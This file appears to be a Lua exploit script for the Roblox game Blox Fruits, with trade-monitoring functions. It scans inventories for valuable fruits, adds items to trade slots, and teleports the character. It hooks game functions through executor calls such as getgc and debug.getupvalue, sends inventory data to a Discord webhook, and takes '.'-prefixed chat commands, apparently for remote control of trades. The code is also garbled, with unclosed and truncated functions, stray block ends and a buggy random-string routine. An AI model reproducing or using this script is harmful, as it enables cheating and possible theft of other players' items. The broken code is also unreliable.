local function InvokeServer(remote, ...)
    local args = {...}
    if #args == 0 then return remote:InvokeServer() end
    return remote:InvokeServer(unpack(args))
end

local function GetFruitInfo(name)
    local lower = string.lower(name)
    local rarity = FruitRarity[lower]
    local emoji = FruitEmojis[lower]
    return rarity and {rarity = rarity, emoji = emoji, name = name} or nil
end

local function IsFruitName(name)
    return GetFruitInfo(name) ~= nil
end

local function IsMutatedFruit(name)
    local lower = string.lower(name)
    for _, pattern in ipairs(FruitDatabase.Mutated) do
        if lower:find(string.lower(pattern)) then
            return true
        end
    end
    return false
end

local function GetFruitType(name)
    local lower = string.lower(name)
    if IsMutatedFruit(lower) then
        return "Mutated Fruit"
    end
    local info = GetFruitInfo(lower)
    if info then return info.rarity end
    return "Unknown"
end

local function ParseInventory(inv)
    local fruits = {}
    local mutations = {}
    local premium = {}
    local mythical = {}
    local legendary = {}
    if not inv then return fruits, mutations, premium, mythical, legendary end
    for _, item in ipairs(inv) do
        local name = item.Name or item.DisplayName
        if name then
            local info = GetFruitInfo(name)
            if info then
                local entry = {
                    name = name,
                    id = item.ItemId or item.Id,
                    count = item.Count or 1,
                    rarity = info.rarity,
                    displayName = item.DisplayName or name,
                    type = item.Type or "Blox Fruit",
                    value = item.Value
                }
                table.insert(fruits, entry)
                if IsMutatedFruit(name) then
                    table.insert(mutations, entry)
                end
                if info.rarity == "Premium" then
                    table.insert(premium, entry)
                elseif info.rarity == "Mythical" then
                    table.insert(mythical, entry)
                elseif info.rarity == "Legendary" then
                    table.insert(legendary, entry)
                end
            end
        end
    end
    return fruits, mutations, premium, mythical, legendary
end

local function GetFruitCount(inv, fruitName)
    if not inv then return 0 end
    local lower = string.lower(fruitName)
    local count = 0
    for _, item in ipairs(inv) do
        if string.lower(item.Name or "") == lower then
            count = count + (item.Count or 1)
        end
    end
    return count
end

local function HasFruit(inv, fruitName)
    return GetFruitCount(inv, fruitName) > 0
end

local function AddFruits(inv, fruitNames)
    if not inv then return 0 end
    local added = 0
    for _, fruitName in ipairs(fruitNames) do
        for _, item in ipairs(inv) do
            if string.lower(item.Name or "") == string.lower(fruitName) then
                if AddItem(item.ItemId or item.Id) then
                    added = added + 1
                end
                break
            end
        end
    end
    return added
end

local function CreatePartTele(character, position)
    local part = Instance.new("Part")
    part.Name = "PartTele"
    part.Size = Vector3.new(10, 1, 10)
    part.Anchored = true
    part.CanCollide = false
    part.Transparency = 1
    part.CFrame = CFrame.new(position)
    part.Parent = character
    return part
end

local function TeleportTo(position)
    local character = LocalPlayer.Character
    if not character then return false end
    local root = character:FindFirstChild("HumanoidRootPart")
    if not root then return false end
    local part = CreatePartTele(character, position)
    local tween = TweenService:Create(root, TweenInfo.new(
        getgenv().TWEEN_TIME or 0.2,
        Enum.EasingStyle.Linear,
        Enum.EasingDirection.InOut
    ), {CFrame = CFrame.new(position)})
    tween:Play()
    tween.Completed:Wait()
    if part then part:Destroy() end
    return true
end

local function TeleportToPart(part)
    if not part then return false end
    local position = part.Position
    return TeleportTo(position)
end

local function SendWebhook(url, data)
    local request = GetHttpRequest()
    if not request then return false end
    local success, response = pcall(function()
        return request({
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
    return success and response and response.StatusCode == 200
end

local function GenerateRandomString(length)
    length = length or 12
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local result = ""
    for i = 1, length do
        result = result .. string.sub(chars, math.random(1, #chars), math.random(1, #chars))
    end
    return result
end

local function PlaySound(soundName, volume, pitch)

local function GetTradeSlots()
    local container = GetTradeContainer()
    if not container then return {} end
    local slots = {}
    for _, child in ipairs(container:GetChildren()) do
        if child:IsA("Frame") and child.Name:match("^%d+$") then
            table.insert(slots, child)
        end
    end
    table.sort(slots, function(a, b) return tonumber(a.Name) < tonumber(b.Name) end)
    return slots
end

local function WaitForSlotChange(slot, timeout)
    local start = os.clock()
    while os.clock() - start < (timeout or 5) do
        task.wait(0.1)
        local item = GetSlotItem(slot)
        if item then
            local name = item:FindFirstChild("Name")
            if name and name.Text ~= "" then
                return true
            end
        end
    end
    return false
end

    end
    return names
end

local function GetGC()
    local results = {}
    local success, gc = pcall(getgc)
    if not success then return results end
    for _, obj in ipairs(gc) do
        if type(obj) == "table" then
            table.insert(results, obj)
        end
    end
    return results
end

local function ScanForFunctions(name)
    local results = {}
    local gc = GetGC()
    for _, obj in ipairs(gc) do
        for key, value in pairs(obj) do
            if type(key) == "string" and key:lower():find(name:lower()) then
                if type(value) == "function" then
                    table.insert(results, {table = obj, key = key, func = value})
                end
            end
        end
    end
    return results
end

local function FindFunctionByName(name)
    local results = ScanForFunctions(name)
    if #results > 0 then
        return results[1].func
    end
    return nil
end

local function HookFunction(name, hook)
    local func = FindFunctionByName(name)
    if not func then return false end
    local old = func
    local new = function(...)
        hook(...)
        return old(...)
    end
    return true
end

local function GetUpvalues(func)
    local results = {}
    local i = 1
    while true do
        local success, value = pcall(function()
            return debug.getupvalue(func, i)
        end)
        if not success or not value then break end
        table.insert(results, value)
        i = i + 1
    end
    return results
end

local function GetConstants(func)
    local results = {}
    local i = 1
    while true do
        local success, value = pcall(function()
            return debug.getconstant(func, i)

        table.insert(results, value)
        i = i + 1
    end

local function DetectMutation(inv)
    if not inv then return {} end
    local mutations = {}
    for _, item in ipairs(inv) do
        local name = item.Name or item.DisplayName
        if name and IsMutatedFruit(name) then
            table.insert(mutations, {
                name = name,
                id = item.ItemId or item.Id,
                count = item.Count or 1,
                displayName = item.DisplayName or name,
                type = item.Type or "Mutated Fruit"
            })
        end
    end
    return mutations
end

function Commands:tp(args)
    if #args == 0 then
        warn("[BF Trade] Usage: .tp <x,y,z> or .tp <location>")
        return false
    end
    local pos = args[1]
    local position
    if type(pos) == "string" then
        if pos:find(",") then
            local parts = {}
            for part in string.gmatch(pos, "[^,]+") do
                table.insert(parts, part)
            end
            if #parts == 3 then
                position = Vector3.new(tonumber(parts[1]), tonumber(parts[2]), tonumber(parts[3]))
            end
        else
            return TeleportToLocation(pos)
        end
    elseif type(pos) == "Vector3" then
        position = pos
    end
    if not position then
        warn("[BF Trade] Invalid position format")
        return false
    end
    local result = TeleportTo(position)
    if result then
        print("[BF Trade] Teleported to " .. tostring(position))
        PlaySound("Teleport", 0.5, 1)
        return true
    else
        warn("[BF Trade] Failed to teleport")
        return false
    end
end

local function ProcessCommand(msg, inv)
    if not msg or msg == "" then return end
    local cmd, args = string.match(msg, "%.(%S+)%s*(.*)$")
    if not cmd then return end
    local argList = {}
    for arg in string.gmatch(args, "[^%s]+") do
        table.insert(argList, arg)
    end
    if Commands[cmd] then
        local success, result = pcall(function()
            return Commands[cmd](inv, argList)
        end)
        if not success then
            warn("[BF Remote] Command failed: " .. tostring(result))
        end
    else
        warn("[BF Remote] Unknown command: ." .. cmd)
    end
end

local function MonitorInventory()
    local last = nil
    while true do
        task.wait(5)
        local inv = GetInventory()
        if inv then
            if not last or #inv ~= #last then
                last = inv
                CheckWantedFruit(inv)
                local mutations = DetectMutation(inv)
                if #mutations > 0 then
                    local msg = "🔮 Mutated fruits detected: "
                    for i, m in ipairs(mutations) do
                        msg = msg .. m.name .. " (x" .. m.count .. ")"
                        if i < #mutations then msg = msg .. ", " end
                    end
                    print(msg)
                    PlaySound("Alert", 0.5, 1)
                    if getgenv().WEBHOOK_URL and getgenv().WEBHOOK_URL ~= "" then
                        local embed = BuildEmbed("Mutated Fruits Detected", msg, 0xFF6B6B, {})
                        SendEmbedToDiscord(getgenv().WEBHOOK_URL, embed)
                    end
                end
                local premium = DetectPremium(inv)
                if #premium > 0 then
                    print("[BF Trade] Premium fruits: " .. #premium)
                end
            end
        end
    end
end

local function MonitorCharacter()
    local character = LocalPlayer.Character
    if not character then return end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.Died:Connect(function()
            print("[BF Trade] Character died")
            PlaySound("Error", 0.5, 1)
        end)
        humanoid.HealthChanged:Connect(function(health)
            if health < 20 then
                PlaySound("Alert", 0.3, 1)
            end
        end)
    end
    local root = character:FindFirstChild("HumanoidRootPart")
    if root then
        root:GetPropertyChangedSignal("Position"):Connect(function()
            if getgenv().TRAVEL_SPEED then
                local velocity = root.Velocity
                if velocity.Magnitude > getgenv().TRAVEL_SPEED then
                    -- Speed monitoring
                end
            end
        end)
    end
end

local function DetectTradeUI()
    local trade = GetTradeUI()
    if not trade then return end
    trade.ChildAdded:Connect(function(child)
        if child.Name == "Container" then
            print("[BF Trade] Trade container detected")
            PlaySound("Trade", 0.5, 1)
            child.ChildAdded:Connect(function(slot)
                if slot:IsA("Frame") and slot.Name:match("^%d+$") then
                    slot.ChildAdded:Connect(function(item)
                        if item.Name == "Item" then
                            local name = GetSlotItemName(slot)
                            if name and name ~= "" then
                                print("[BF Trade] Item added to slot: " .. name)
                                PlaySound("Click", 0.3, 1)
                            end
                        end
                    end)
                end
            end)
        end
    end)
    trade.ChildRemoved:Connect(function(child)
        if child.Name == "Container" then
            print("[BF Trade] Trade container removed")
            PlaySound("Click", 0.5, 1)
        end
    end)
end

local function MonitorTextChat()
    local textService = TextChatService
    local channel = textService:FindFirstChild("All")

        if text:sub(1, 1) == "." then

        end
    end)
end
